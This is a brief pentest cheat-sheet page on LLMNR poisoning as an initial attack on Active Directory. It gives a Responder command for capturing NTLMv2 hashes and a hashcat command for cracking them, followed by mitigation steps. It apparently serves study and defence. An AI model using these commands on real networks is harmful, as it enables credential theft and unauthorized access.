# AD Initial attack vector

## LLMNR poisoning

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2024-05-06 003240.png" alt=""><figcaption></figcaption></figure>

```
sudo responder -I <interface> -dwPv
# crack hash
hashcat -m 5600 <hash.txt> <wordlist>
```

### Mitigation

```
# Disable LLMNR
# Disable NBT-NS


#If we can't disable
# Require network access control
# Require strong password policy
```
